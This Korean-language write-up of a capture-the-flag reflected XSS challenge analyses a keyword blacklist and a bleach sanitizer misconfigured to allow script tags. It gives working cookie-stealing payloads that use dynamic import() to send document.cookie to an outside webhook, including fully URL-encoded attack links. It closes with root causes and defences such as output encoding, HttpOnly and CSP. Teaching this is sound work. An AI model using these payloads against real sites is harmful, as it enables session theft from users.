## 2. 소스코드 분석

### 2-1. `/test` 처리 흐름 (app.py)
```python
banlist = ["`","'","alert(","fetch(","replace(","[","]","javascript",
           "@","!","%","location","href","window","eval"]

@app.route('/test')
def test():
    payload = request.args.get('payload')
    payload = payload.lower()                    # ① 전부 소문자화
    if any(banned in payload for banned in banlist):  # ② 블랙리스트
        payload = "Nope!"
    input = sanitize_input(payload)              # ③ bleach 새니타이저
    return f"{input}"                            # 그대로 반사 출력
```

### 2-2. 새니타이저 (sanitizer.py)
```python
ALLOWED_TAGS = ['script']   # script 태그만 허용
bleach.clean(user_input, tags=ALLOWED_TAGS, attributes={}, strip=True, ...)
```
→ HTML 태그 기준으로 script만 허용하고 다른 태그는 제거/이스케이프하도록 설정

### 2-3. 봇 (app.py `/flag`)

→ `/flag?answer=` 로 답을 내면, 봇이 **flag 쿠키를 지닌 채** `/test?payload=답` 을 방문한다.

## 3. 공격 설계

- 태그는 `<script>`만 살아남으므로 **script 안에서** 요청을 발생시켜야 함.
- 허용되는 것: **큰따옴표(`"`)**, `+`(문자열 연결), `document.cookie`, `import(`
- 막히는 것: `fetch`·`location`·`window`·`eval`(블랙리스트), `Image`(소문자화로 깨짐),
  그리고 script 내용의 `<`(이스케이프됨) → **`document.write("<img>")` 방식 불가**

### 3-1. 1차 시도와 실패 (중요 학습 포인트)
처음엔 `document.write`로 `<img>` 태그를 써넣으려 했다.
```
<script>document.write("<img src=https://webhook/?c="+document.cookie)</script>
```
그러나 `/test` 반사 결과를 보니 **`<img` 가 `&lt;img` 로 이스케이프**되어,
실제 이미지 태그가 아니라 단순 텍스트로 출력됐다 → 요청이 나가지 않음.

> 📸 **[이미지 02]** `<img` 가 `&lt;img` 로 깨진 반사 결과 (실패 케이스)
> `![img 방식 실패](images/02_img_escaped_1.png)`
> `![img 방식 실패](images/02_img_escaped_2.png)`

### 3-2. 해결 — `<` 없이 요청 발생시키기
`<` 를 아예 쓰지 않는 **동적 import** 로 전환.
```
<script>import("https://<WEBHOOK_URL>/?f="+document.cookie)</script>
```
- `import()`는 별도의 `<img>` 등의 HTML 태그를 생성하지 않고 JavaScript에서 지정한 모듈 URL에 대한 네트워크 요청을 발생시킬 수 있다는 점을 이용했다
- `<`·`>`·`&` 없음 → bleach 이스케이프 회피
- 블랙리스트 문자 없음, 전부 소문자여도 유효한 JS

## 6. 취약점 발생 원인
- `/test`가 사용자 입력을 **필터링 후 그대로 반사 출력**하고, `<script>` 실행을 허용.
- 방어를 **블랙리스트 + 태그 화이트리스트(bleach)** 로만 구성 → 우회 경로가 남음.
  - `<script>` 자체를 허용한 새니타이저 설정 오류(`ALLOWED_TAGS=['script']`)
  - 블랙리스트에 `import`·`document.write` 등 누락

## 7. 대응 방안
- **블랙리스트가 아니라 출력 인코딩**으로 방어 (입력이 코드로 해석되지 않게).
- 새니타이저에서 **`<script>` 태그를 허용하지 않기** (화이트리스트를 안전하게 구성).
- 쿠키에 **`HttpOnly`** → JS의 `document.cookie` 접근 차단으로 탈취 피해 완화.
- 필요 시 **CSP** 로 외부 출처로의 요청·스크립트 실행 제한.
  - CSP를 적절하게 설정하여 인라인 스크립트 실행이나 허용되지 않은 외부 리소스 로딩 등을 제한하는 추가 방어 계층으로 활용.

## 8. 배운 점 / 회고
- **블랙리스트 필터의 한계**를 직접 확인했다. 금지 문자를 늘려도
  `import`·`document.write`처럼 빠진 경로가 있으면 우회된다.
- 새니타이저(bleach)가 `<script>`를 허용하도록 **설정을 잘못하면** 무력하다.
- 처음 `<img>` 방식이 `&lt;`로 막히면서, script 내용의 특수문자 처리까지
  직접 확인해야 한다는 걸 배웠다 → `<` 없이 되는 `import()` 로 전환.
- XSS의 핵심 방어는 출력 문맥에 맞는 인코딩과 안전한 HTML Sanitization이며, HttpOnly와 CSP 등은 XSS 발생 시 피해를 줄이는 추가 방어 계층이라는 점을 확인했다.

## 9. 재현용 페이로드 / URL (실습용)

> 아래 인코딩된 링크는 **드림핵 주소가 포함돼 있지 않아서**, 인스턴스가 바뀌어도
> `http://<본인 인스턴스>` 앞부분만 교체하면 그대로 재사용할 수 있다.
> (단, webhook 주소를 새로 만들면 인코딩 값도 새로 만들어야 한다.)

### 원본 페이로드 (사람이 읽는 형태)
```
# 실패한 방식 — bleach가 < 를 &lt; 로 이스케이프
<script>document.write("<img src=x")</script>

# 성공한 방식 — import 로 네트워크 요청 발생
<script>import("https://<WEBHOOK_URL>/?f="+document.cookie)</script>
```

### 실제 실행 URL (인코딩 완료)

**ⓐ `<img` 실패 재현** — `/test` 반사 확인 (Ctrl+U 로 `&lt;img` 확인)
```
http://host3.dreamhack.games:23565/test?payload=%3Cscript%3Edocument.write(%22%3Cimg%20src%3Dx%22)%3C/script%3E
```

**ⓑ import 요청 확인** — `/test` (webhook에 빈 요청 도착)
```
http://host3.dreamhack.games:23565/test?payload=%3Cscript%3Eimport%28%22https%3A%2F%2Fwebhook.site%2F6ae824f3-d9fc-4942-89cd-4dbba1a2eb29%2F%3Fa%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E
```

**ⓒ 봇 호출 → FLAG 수신** — `/flag` (answer 는 두 겹 인코딩)
```
http://host3.dreamhack.games:23565/flag?answer=%253Cscript%253Eimport%2528%2522https%253A%252F%252Fwebhook.site%252F6ae824f3-d9fc-4942-89cd-4dbba1a2eb29%252F%253Ff%253D%2522%252Bdocument.cookie%2529%253C%252Fscript%253E
```
→ ⓒ 방문 후 webhook.site에 `?f=flag=4TH3N3{...}` 요청이 뜨면 성공.

> 인코딩 참고: `%3C`=`<`, `%3E`=`>`, `%22`=`"`, `%20`=공백, `%28`=`(`, `%29`=`)`, `%2B`=`+`, `%2F`=`/`
> ⓒ에 `%25`(=`%`)가 많은 건 **두 번 인코딩**해서 그렇다. (`%253C` → `%3C` → `<`)
